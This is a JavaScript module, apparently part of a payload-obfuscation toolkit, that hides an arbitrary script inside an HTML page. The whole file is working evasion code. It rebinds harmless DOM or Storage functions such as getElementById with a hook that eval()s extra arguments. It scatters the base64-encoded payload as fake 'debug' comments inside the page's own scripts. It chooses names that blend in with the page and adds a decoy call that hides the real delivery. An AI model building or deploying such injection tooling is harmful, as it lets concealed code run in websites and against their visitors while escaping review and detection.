// SPDX-License-Identifier: AGPL-3.0-or-later
/*
 * element-hook.js — Benign-Function Rebinding & Debug-Comment Cargo.
 *
 * Pipeline:
 *   Pass 1 — Hook installation (top of page, minified; hook const selected
 *            to avoid page identifier collisions, suffixed only on collision):
 *              document-owned:   const _N=T.bind(o);T=(...a)=>1 in a?
 *                                  a.map(v=>{try{eval(v)}catch{_N(v)}}):_N(a[0]);
 *              prototype-owned:  const _N=T;T=function(...a){return 1 in a?
 *                                  a.map(v=>{try{eval(v)}catch{_N.call(this,v)}}):
 *                                  _N.call(this,a[0])};
 *            Benign single-argument calls pass through untouched; multi-call
 *            usage (delivery-only for these functions) evaluates each string
 *            argument, falling back to the original for non-JS strings. The
 *            single eval in the document lives inside the hook.
 *   Pass 2 — Cargo: JS -> UTF-8 -> base64 -> 1-4 chunks at 4-char boundaries.
 *            Script variant placement:
 *              a) existing usable inline scripts before the bootstrap: chunks
 *                 injected as /*debug:CHUNK*\\/ comments at INTERIOR token
 *                 boundaries — points after ';', '}', or '\n' that are
 *                 never inside a string/template/regex/comment and never
 *                 inside a for(...) header, restricted to the middle 80% of
 *                 each host body; a group may occupy several distinct
 *                 mid-script points; per-script parse-gate before splicing.
 *              b) no usable inline scripts: lead chunks as bare cargo tags,
 *                 FINAL chunk merged into the bootstrap tag (the collector
 *                 reads its own s.text).
 *            HTML variant: <!--debug:CHUNK--> comments, always page-level.
 *   Pass 3 — Bootstrap (minified, no IIFE, no eval): a top-level `let`
 *            with a convention-matched name recovers the cargo via the
 *            de-padded extractor regex and delivers it with one plain
 *            two-argument call to the rebound function.
 *
 * for-header soundness note: ';' can syntactically appear inside
 * parentheses ONLY as a for-header semicolon (every other parenthesised
 * context forbids bare ';'), so ';' at paren depth > 0 is definitionally
 * excluded; newlines are excluded only under a paren explicitly marked as
 * a for-header (word 'for' immediately before '(', not property access).
 *
 * Naming policy: bootstrap variable matches the hook-const convention
 * (_js/_src/_code/_data/_run) chosen among identifiers not already used on
 * the page or in the payload; '_' + hex only as collision fallback. Hook
 * consts filtered the same way; suffixed only if all six collide.
 *
 * Verification: payload, hook, bootstrap (+ merged form), and every
 * modified host body dry-run before injection; final gates: hook installed
 * exactly once, exactly one eval, canonical tolerant extractors re-decode
 * the payload byte-for-byte — or nothing is emitted.
 */

import {
  randInt, secureChoice, randomHexId, bytesToBase64, bytesEqual, utf8,
  stripOriginalJs, log, RE,
} from '../lib/engine-utils.js';

// ------------------------------------------------------------ hook registry
/**
 * Single-argument benign functions ONLY: under eval-first multi-argument
 * delivery, any function benignly called with >=2 arguments would have
 * legitimate calls intercepted by try{eval}. Every entry's benign use is
 * exactly one non-cargo argument. Prototype targets require the
 * `function` rebind form (dynamic `this`); document-owned use the
 * shorter arrow with a bound capture.
 */
const BENIGN_HOOKS = [
  { constName: '_get',    target: 'document.getElementById',           receiver: 'document',                 proto: false },
  { constName: '_create', target: 'document.createElement',          receiver: 'document',                 proto: false },
  { constName: '_query',  target: 'document.querySelector',         receiver: 'document',                 proto: false },
  { constName: '_attr',   target: 'Element.prototype.getAttribute', receiver: 'document.documentElement', proto: true },
  { constName: '_text',   target: 'document.createTextNode',        receiver: 'document',                 proto: false },
  { constName: '_item',   target: 'Storage.prototype.getItem',      receiver: 'localStorage',             proto: true },
];

function splitTarget(t) {
  const i = t.lastIndexOf('.');
  return [t.slice(0, i), t.slice(i + 1)];
}

/** Minified rebind; constName passed separately (may carry a collision suffix). */
function buildHookSource(h, constName) {
  if (h.proto) {
    return `const ${constName}=${h.target};` +
      `${h.target}=function(...a){return 1 in a?` +
      `a.map(v=>{try{eval(v)}catch{${constName}.call(this,v)}}):` +
      `${constName}.call(this,a[0])};`;
  }
  const owner = splitTarget(h.target)[0];
  return `const ${constName}=${h.target}.bind(${owner});` +
    `${h.target}=(...a)=>1 in a?a.map(v=>{try{eval(v)}catch{${constName}(v)}}):${constName}(a[0]);`;
}

// -------------------------------------------------------------- cargo regex
// Canonical verification patterns (tolerant form — matches any emitter's
// debug comments); the EMITTED bootstrap regexes are de-padded forms that
// exactly match this engine's own emission. The HTML variant writes "<!--"
// as <\u0021-- (identical match; cannot trip script-data-escaped state).
const DEBUG_JS_RE = /\/\*\s*debug:\s*([A-Za-z0-9+/=]+)\s*\*\//g;
const DEBUG_HTML_RE = /<!--\s*debug:\s*([A-Za-z0-9+/=]+)\s*-->/g;

const EMIT_JS_RE = '/\\/\\*debug:([\\w+/=]+)\\*\\//g';
const EMIT_HTML_RE = '/<\\u0021--debug:([\\w+/=]+)-->/g';

function bstrToU8(s) {
  const u = new Uint8Array(s.length);
  for (let i = 0; i < s.length; i++) u[i] = s.charCodeAt(i);
  return u;
}

// ------------------------------------------------------------- JS scanner
/**
 * Mask/string-aware scanner; the single source of truth for identifier
 * collection, cargo-spot screening, and mid-body comment-point discovery.
 * Masks are ascending and disjoint by construction; forward consumption of
 * masks lets the point walker skip strings/templates/regex/comments
 * wholesale.
 */
function scanJs(code) {
  const strings = [], masks = [];
  let i = 0, lastWord = '';
  const REGEX_CTX = new Set(['', '(', ',', '=', ':', '[', '!', '&', '|', '?', '{', '}', ';', '+', '-', '*', '%', '~', '^', '<', '>']);
  const KW = new Set(['return', 'typeof', 'case', 'in', 'of', 'new', 'delete', 'void', 'instanceof', 'do', 'else']);
  const isWordChar = (c) => /[A-Za-z0-9_$]/.test(c);

  while (i < code.length) {
    const c = code[i];
    if (c === '/' && code[i + 1] === '/') {
      const s = i;
      while (i < code.length && code[i] !== '\n') i++;
      masks.push({ start: s, end: i });
      continue;
    }
    if (c === '/' && code[i + 1] === '*') {
      const s = i;
      i += 2;
      while (i < code.length && !(code[i] === '*' && code[i + 1] === '/')) i++;
      i = Math.min(i + 2, code.length);
      masks.push({ start: s, end: i });
      continue;
    }
    if (c === '"' || c === "'" || c === '`') {
      let j = i + 1;
      while (j < code.length) {
        if (code[j] === '\\') { j += 2; continue; }
        if (code[j] === c) break;
        j++;
      }
      const span = { start: i, end: Math.min(j + 1, code.length) };
      strings.push(span);
      masks.push(span);
      i = span.end;
      lastWord = '';
      continue;
    }
    if (c === '/' && (REGEX_CTX.has(lastWord) || KW.has(lastWord))) {
      let j = i + 1, inClass = false;
      while (j < code.length) {
        const r = code[j];
        if (r === '\\') { j += 2; continue; }
        if (r === '[') inClass = true;
        else if (r === ']') inClass = false;
        else if (r === '/' && !inClass) break;
        else if (r === '\n') break;
        j++;
      }
      if (j < code.length && code[j] === '/' && code[j - 1] !== '\n') {
        let k = j + 1;
        while (k < code.length && /[a-z]/i.test(code[k])) k++;
        masks.push({ start: i, end: k });
        i = k;
        lastWord = '';
        continue;
      }
    }
    if (isWordChar(c)) {
      let j = i;
      while (j < code.length && isWordChar(code[j])) j++;
      lastWord = code.slice(i, j);
      i = j;
      continue;
    }
    if (!/\s/.test(c)) lastWord = c;
    i++;
  }
  return { strings, masks };
}

/** Identifier collection with masked spans blanked first. */
function scanIdentifiers(code) {
  const identifiers = new Set();
  const { masks } = scanJs(code);
  let stripped = code;
  for (const m of [...masks].sort((a, b) => b.start - a.start))
    stripped = stripped.slice(0, m.start) + ' '.repeat(m.end - m.start) + stripped.slice(m.end);
  for (const w of stripped.match(/\b[A-Za-z_$][\w$]*\b/g) || []) identifiers.add(w);
  return identifiers;
}

// -------------------------------------------------------- page-level utils
const maskLike = (html, start, end) => {
  const checks = [RE.comment, RE.scriptBlock,
    /<style\b[^>]*>[\s\S]*?<\/style\s*>/gi,
    /<textarea\b[^>]*>[\s\S]*?<\/textarea\s*>/gi];
  return checks.some((re) => {
    for (const m of html.matchAll(re))
      if (start < m.index + m[0].length && end > m.index) return true;
    return false;
  });
};

/** Hook goes after the first real <head>/<html> open tag, else doctype, else 0. */
function hookInsertOffset(html) {
  for (const re of [/<head[^>]*>/gi, /<html[^>]*>/gi]) {
    for (const m of html.matchAll(re)) {
      if (!maskLike(html, m.index, m.index + m[0].length))
        return m.index + m[0].length;
    }
  }
  const dt = /^(\s|<!--[\s\S]*?-->)*<!doctype[^>]*>/i.exec(html);
  return dt ? dt[0].length : 0;
}

/** Tail goes before the last real </body> (preferred), else </html>, else EOF. */
function tailInsertOffset(html) {
  for (const re of [RE.bodyClose, RE.htmlClose]) {
    let last = null, m;
    re.lastIndex = 0;
    while ((m = re.exec(html))) {
      if (!maskLike(html, m.index, m.index + m[0].length)) last = m;
    }
    if (last) return last.index;
  }
  return html.length;
}

/** Benign decoy first argument: id-shaped string that is a bare, usually
 *  undefined identifier — eval() throws, the fallback runs a harmless
 *  original lookup. */
function decoyId() {
  const w = secureChoice(['root', 'app', 'main', 'container', 'content', 'wrapper', 'entry']);
  return `${w}_${randomHexId(2)}`;
}

/** All identifiers in scope for injected top-level scripts: every inline
 *  script body on the page (conservatively one shared global scope) plus
 *  the payload itself. */
function collectUsedIdentifiers(html, js) {
  const used = new Set();
  let m; RE.scriptBlock.lastIndex = 0;
  while ((m = RE.scriptBlock.exec(html)))
    for (const w of scanIdentifiers(m[2])) used.add(w);
  for (const w of scanIdentifiers(js)) used.add(w);
  return used;
}

// ------------------------------------------------------ mid-script cargo
/**
 * Token-boundary comment insertion points in a JS body, EXCLUDING
 * semicolons and newlines that live inside a for(...) header.
 *
 * Soundness of the depth rule: ';' can syntactically appear inside
 * parentheses ONLY as part of a for-header (for(init;cond;inc)) — every
 * other parenthesised context forbids bare ';'. Therefore ';' at paren
 * depth > 0 is definitionally a for-header semicolon. Newlines are legal
 * in many paren contexts (arg lists etc. stay usable), so they are
 * excluded only when an enclosing paren is explicitly marked as a
 * for-header (word 'for', not property access, immediately before '(').
 * Points after '}' are always candidates (a block close in a for body is
 * a safe token boundary).
 *
 * The forward walk consumes scanner masks wholesale, so no point ever lies
 * inside a string/template/regex/comment. Injected comments are
 * newline-free, so host ASI behavior is untouched.
 *
 * @returns {{points: number[], forExcluded: number[]}}
 */
function findSafeCommentPoints(body) {
  const { masks } = scanJs(body);
  const pts = [];
  const forExcluded = [];
  const stack = [];        // one entry per open '(' — true = for-header
  let lastWord = '';
  let m = 0;              // next unconsumed mask (ascending, disjoint)

  const consider = (point, afterSemi) => {
    if (point >= body.length) return;
    const inForHeader = afterSemi
      ? stack.length > 0                    // ';' inside ANY paren => for header
      : stack.some(Boolean);                // '\n' needs an actual for-header paren
    if (inForHeader) { if (forExcluded[forExcluded.length - 1] !== point) forExcluded.push(point); return; }
    if (pts.length && pts[pts.length - 1] === point) return; // dedupe runs
    pts.push(point);
  };

  let i = 0;
  while (i < body.length) {
    if (m < masks.length && i >= masks[m].start) {   // inside a mask: skip span
      i = masks[m].end;
      m++;
      lastWord = '';
      continue;
    }
    const c = body[i];

    if (c === '(') {
      stack.push(lastWord === 'for');
      lastWord = '';
      i++;
    } else if (c === ')') {
      stack.pop();
      lastWord = '';
      i++;
    } else if (c === ';') {
      consider(i + 1, true);
      lastWord = '';
      i++;
    } else if (c === '\n') {
      consider(i + 1, false);
      lastWord = '';
      i++;
    } else if (c === '}') {
      consider(i + 1, false);
      lastWord = '';
      i++;
    } else if (/[A-Za-z0-9_$]/.test(c)) {
      let j = i;
      while (j < body.length && /[A-Za-z0-9_$]/.test(body[j]) &&
             !(m < masks.length && j === masks[m].start)) j++;
      lastWord = body.slice(i, j);
      i = j;
      // `for` as property access (obj.for(...)) must not mark the paren:
      // look back over whitespace to the previous non-space char.
      let k = i - lastWord.length - 1;
      while (k >= 0 && /\s/.test(body[k])) k--;
      if (k >= 0 && body[k] === '.') lastWord = '';
    } else {
      if (/\S/.test(c)) lastWord = '';
      else { /* spaces/tabs preserve lastWord so `for (` still marks */ }
      i++;
    }
  }
  return { points: pts, forExcluded };
}

/**
 * Usable inline scripts BEFORE `limit` (they have run when the collector
 * executes): source-less, non-module/non-JSON/non-importmap, non-empty,
 * with at least one safe comment point. Points restricted to the interior
 * 10-90% band where available.
 */
function findCargoSpots(html, limit) {
  const spots = [];
  let m; RE.scriptBlock.lastIndex = 0;
  while ((m = RE.scriptBlock.exec(html))) {
    if (m.index >= limit) break;
    const attrs = m[1] || '';
    if (/\bsrc\s*=/i.test(attrs)) continue;
    if (/\btype\s*=\s*["']?(?:module|application\/(?:json|ld\+json)|importmap|speculationrules)/i.test(attrs)) continue;
    const bodyStart = m.index + m[0].indexOf('>') + 1;
    const body = m[2];
    if (!body.trim()) continue;

    const scanned = findSafeCommentPoints(body);
    if (!scanned.points.length) continue;

    const lo = Math.floor(body.length * 0.1);
    const hi = Math.ceil(body.length * 0.9);
    let interior = scanned.points.filter((p) => p > lo && p < hi);
    if (!interior.length) interior = scanned.points.filter((p) => p > 0);
    if (!interior.length) interior = [0];       // degenerate host: body start

    spots.push({ bodyStart, body, points: interior, forExcluded: scanned.forExcluded.length });
  }
  return spots;
}

/**
 * Assign a chunk group to distinct interior points (shuffled); overflow
 * chunks concatenate at the last point, keeping offsets duplicate-free.
 * @returns {Array<{localPoint:number, comments:string[]}>} ascending
 */
function planPointAssignments(points, groupChunks) {
  if (!groupChunks.length) return [];
  const shuffled = [...points];
  for (let i = shuffled.length - 1; i > 0; i--) {
    const j = randInt(i + 1);
    [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
  }
  const per = new Map();
  groupChunks.forEach((c, idx) => {
    const p = shuffled[Math.min(idx, shuffled.length - 1)];
    if (!per.has(p)) per.set(p, []);
    per.get(p).push(c);
  });
  return [...per.entries()]
    .map(([localPoint, comments]) => ({ localPoint, comments }))
    .sort((a, b) => a.localPoint - b.localPoint);
}

/**
 * Reconstruct the modified body locally (ascending insertions) and
 * parse-gate it: if the ORIGINAL body parsed, the commented body must too,
 * or the entire compile throws before any splice.
 */
function applyAndGateCommentedBody(body, plan) {
  let out = body;
  for (const { localPoint, comments } of plan)
    out = out.slice(0, localPoint) + comments.map((c) => `/*debug:${c}*/`).join('') + out.slice(localPoint);
  const origParsed = parsesCleanly(body);
  if (origParsed && !parsesCleanly(out))
    throw new Error('ELEMENT-HOOK — cargo comment broke an existing script; output not emitted.');
  return out;
}

/** Distribute k chunks contiguously across n spots (ascending, in order). */
function distributeChunks(chunks, nSpots) {
  const per = Array.from({ length: nSpots }, () => []);
  for (let i = 0; i < chunks.length; i++)
    per[Math.min(Math.floor((i * nSpots) / chunks.length), nSpots - 1)].push(chunks[i]);
  return per;
}

/** Split base64 (len %4==0) into k chunks at 4-char boundaries; each chunk
 *  remains a valid standalone atob input. */
function chunkBase64(b64, k) {
  if (b64.length < 16) return [b64];
  const segLen = Math.max(4, Math.floor(Math.floor(b64.length / k) / 4) * 4);
  const chunks = [];
  for (let pos = 0; pos < b64.length; pos += segLen)
    chunks.push(b64.slice(pos, Math.min(pos + segLen, b64.length)));
  return chunks;
}

// ------------------------------------------------------------- bootstrap
/**
 * Minified bootstrap. NO IIFE and NO eval here — a top-level `let` with a
 * collision-checked name scopes the collector, and delivery is one plain
 * two-argument call: the hook evals the cargo (argument 2, valid JS) and
 * harmlessly falls back for the decoy id (argument 1, bare identifier).
 * The emitted regex sources cannot match their own escaped text, so merging
 * the final cargo chunk into this same script is self-consistent.
 */
function buildBootstrap(variant, hook, varName) {
  const collector = variant === 'script'
    ? `[...document.scripts].flatMap(s=>s.src?[]:[...s.text.matchAll(${EMIT_JS_RE})].map(x=>atob(x[1]))).join('')`
    : `[...document.documentElement.innerHTML.matchAll(${EMIT_HTML_RE})].map(x=>atob(x[1])).join('')`;
  const prop = splitTarget(hook.target)[1];
  return `let ${varName}=${collector};${hook.receiver}.${prop}("${decoyId()}",${varName})`;
}

// ------------------------------------------------------------ verification
/** Replicate the tolerant runtime extractor against the final HTML exactly. */
function extractCargo(html, variant) {
  const decoded = [];
  if (variant === 'script') {
    let m; RE.scriptBlock.lastIndex = 0;
    while ((m = RE.scriptBlock.exec(html))) {
      if (/\bsrc\s*=/i.test(m[1] || '')) continue;
      for (const c of m[2].matchAll(DEBUG_JS_RE)) decoded.push(atob(c[1]));
    }
  } else {
    for (const c of html.matchAll(DEBUG_HTML_RE)) decoded.push(atob(c[1]));
  }
  return decoded.join('');
}

/** Parse-only dry run; module payloads are not Function-body parseable. */
function parsesCleanly(js) {
  if (/\bimport\s|\bexport\s/.test(js)) return true;
  try {
    // eslint-disable-next-line no-new-func
    new Function(js);
    return true;
  } catch {
    return false;
  }
}

// ------------------------------------------------------------------- engine
export const engine = {
  id: 'element-hook',
  label: 'Benign Hook (debug-comment cargo)',
  description:
    'Rebinds a single-argument benign function (getElementById, createElement, ' +
    'querySelector, getAttribute, createTextNode, or Storage.getItem) with a ' +
    'minified multiparameter hook (single hook-internal eval). The JS payload is ' +
    'hidden as base64 debug: comments injected at interior token boundaries of ' +
    'the page\'s existing scripts (for-header semicolons excluded; fallback: ' +
    'merged into the bootstrap tag when no usable scripts exist) and delivered ' +
    'by one plain two-argument call. All generated code is byte-minimized ' +
    'except names, which follow page conventions with random shapes only on ' +
    'collision. Verified: canonical extractors re-decode the payload byte-for-byte.',

  execute({ html, js }) {
    if (!js || !js.trim()) throw new Error('JavaScript payload is empty.');
    const stats = [];

    // Payload gate: the hook eval()s this exact string at runtime — refuse
    // to ship a payload that would fall through to the harmless fallback.
    if (!parsesCleanly(js))
      throw new Error('ELEMENT-HOOK — payload does not parse; it would be ' +
        'discarded by try{eval}catch{fallback} at runtime. Nothing emitted.');

    // ---- Identifier-aware name selection ----
    const used = collectUsedIdentifiers(html, js);

    let hook, hookConst, hookSuffixed = false;
    const hookPool = BENIGN_HOOKS.filter((h) => !used.has(h.constName));
    if (hookPool.length) {
      hook = secureChoice(hookPool);
      hookConst = hook.constName;                       // convention match
    } else {
      hook = secureChoice(BENIGN_HOOKS);               // all consts taken
      hookConst = `${hook.constName}_${randomHexId(2)}`; // suffix fallback
      hookSuffixed = true;
    }
    used.add(hookConst);

    let varName, varRandom = false;
    const free = ['_js', '_src', '_code', '_data', '_run'].filter((n) => !used.has(n));
    if (free.length) {
      varName = secureChoice(free);                     // convention match
    } else {
      varRandom = true;                                 // random fallback
      do { varName = '_' + randomHexId(2); } while (used.has(varName));
    }
    used.add(varName);

    const hookSource = buildHookSource(hook, hookConst);
    stats.push(`hook function ............. ${hook.target}`);
    stats.push(`hook const ................. ${hookConst}${hookSuffixed ? ' (suffix fallback: name in use on page)' : ''}`);
    stats.push(`bootstrap variable ......... ${varName}${varRandom ? ' (random fallback: convention names in use)' : ' (convention-matched)'}`);

    // ---- Variant selection + pre-check ----
    const variant = secureChoice(['script', 'html']);
    stats.push(`cargo variant .............. ${variant === 'script' ? 'script comments' : 'html comments'}`);

    const preRe = variant === 'script' ? DEBUG_JS_RE : DEBUG_HTML_RE;
    preRe.lastIndex = 0;
    if (preRe.test(html))
      throw new Error(`Page already contains ${variant}-variant "debug:" comments; ` +
        'the runtime extractor would capture them alongside the cargo.');

    // ---- Cargo ----
    const b64 = bytesToBase64(utf8.encode(js));
    const kMax = Math.max(1, Math.min(4, Math.floor(b64.length / 64)));
    const k = kMax === 1 ? 1 : 1 + randInt(kMax - 1);
    const chunks = chunkBase64(b64, k);

    const bootstrapBody = buildBootstrap(variant, hook, varName);

    // ---- Assembly plan: all offsets computed on the stripped base string ----
    const stripped = stripOriginalJs(html, js);
    const hookAt = hookInsertOffset(stripped);
    const tailAt = tailInsertOffset(stripped);
    const insertions = [{ off: hookAt, text: `<script>${hookSource}</script>` }];

    if (variant === 'script') {
      const spots = findCargoSpots(stripped, tailAt);
      if (spots.length) {
        // Placement mode A: cargo rides inside the page's existing scripts,
        // at interior token-boundary points (for-headers excluded).
        const groups = distributeChunks(chunks, spots.length);
        const usedSpots = [];
        let pointCount = 0, offsetSum = 0, bodyLenSum = 0;

        spots.forEach((spot, i) => {
          if (!groups[i].length) return;
          const plan = planPointAssignments(spot.points, groups[i]);
          const commented = applyAndGateCommentedBody(spot.body, plan); // throws on breakage
          // Whole-body replacement in one atomic splice (end set): this is
          // what lets the per-script parse gate run on the exact shipped text.
          insertions.push({ off: spot.bodyStart, end: spot.bodyStart + spot.body.length, text: commented });
          plan.forEach(() => {
            pointCount++;
            bodyLenSum += spot.body.length;
          });
          offsetSum += plan.reduce((s, p) => s + p.localPoint, 0);
          usedSpots.push(i);
        });

        insertions.push({ off: tailAt, text: `<script>${bootstrapBody}</script>` });
        const forSkipped = usedSpots.reduce((n, si) => n + (spots[si].forExcluded || 0), 0);
        stats.push(`cargo placement ........... ${chunks.length} chunk(s) in ${usedSpots.length} existing script(s) at ${pointCount} interior point(s)`);
        if (forSkipped)
          stats.push(`for-header exclusion ...... ${forSkipped} semicolon(s) inside for(...) headers avoided`);
        if (pointCount && bodyLenSum)
          stats.push(`interior depth ............. avg ${(offsetSum / bodyLenSum * 100).toFixed(0)}% into host bodies (10-90% band)`);
      } else {
        // Placement mode B: no existing usable scripts — lead chunks as bare
        // cargo tags, FINAL chunk merged into the bootstrap tag (the
        // collector reads its own s.text, so the merged chunk is captured).
        const lead = chunks.slice(0, -1).map((c) => `<script>/*debug:${c}*/</script>`).join('');
        const last = chunks[chunks.length - 1];
        insertions.push({ off: tailAt,
          text: `${lead}<script>/*debug:${last}*/${bootstrapBody}</script>` });
        stats.push('cargo placement ........... no existing inline scripts; final chunk merged into bootstrap tag');
      }
    } else {
      insertions.push({ off: tailAt,
        text: chunks.map((c) => `<!--debug:${c}-->`).join('') + `<script>${bootstrapBody}</script>` });
      stats.push('cargo placement ........... html comments (page-level), bootstrap separate');
    }
    stats.push(`cargo chunks ............... ${chunks.length} (${b64.length} b64 chars)`);

    // ---- Parse dry-runs on generated bodies (merged form where applicable) ----
    const dryRuns = [['hook', hookSource], ['bootstrap', bootstrapBody]];
    if (variant === 'script' && findCargoSpots(stripped, tailAt).length === 0 && chunks.length) {
      const last = chunks[chunks.length - 1];
      dryRuns.push(['bootstrap+cargo', `/*debug:${last}*/${bootstrapBody}`]);
      // (mode-A bodies were already gated inside applyAndGateCommentedBody)
    }
    for (const [name, src] of dryRuns) {
      try {
        // eslint-disable-next-line no-new-func
        new Function(src);
      } catch (e) {
        throw new Error(`ELEMENT-HOOK ${name} failed its parse dry-run: ${e.message}`);
      }
    }

    // ---- Splice: pure inserts and whole-body replacements, descending ----
    const ordered = insertions
      .map((ins, idx) => ({ ...ins, idx }))
      .sort((a, b) => b.off - a.off || b.idx - a.idx);
    let finalHtml = stripped;
    for (const ins of ordered) {
      if (ins.end !== undefined)
        finalHtml = finalHtml.slice(0, ins.off) + ins.text + finalHtml.slice(ins.end);
      else
        finalHtml = finalHtml.slice(0, ins.off) + ins.text + finalHtml.slice(ins.off);
    }

    // ---- Final gates on the exact bytes to be shipped ----
    if (finalHtml.split(hookSource).length - 1 !== 1)
      throw new Error('ELEMENT-HOOK — hook must be installed exactly once; output not emitted.');
    const evalUses = finalHtml.split('eval(').length - 1;
    if (evalUses > 1)
      throw new Error(`ELEMENT-HOOK — expected exactly 1 eval (inside the hook), found ${evalUses}; output not emitted.`);
    const recovered = extractCargo(finalHtml, variant);
    if (!bytesEqual(bstrToU8(recovered), utf8.encode(js)))
      throw new Error('ELEMENT-HOOK — runtime extractor round-trip mismatch; output not emitted.');
    stats.push('round-trip verified ....... extractor re-decodes payload byte-for-byte');

    return {
      html: finalHtml,
      stdout: log('ELEMENT-HOOK',
        ...stats,
        `payload size ............... ${js.length} chars -> ${b64.length} b64 chars + hook/bootstrap`),
      stderr: '',
    };
  },
};
export default engine;
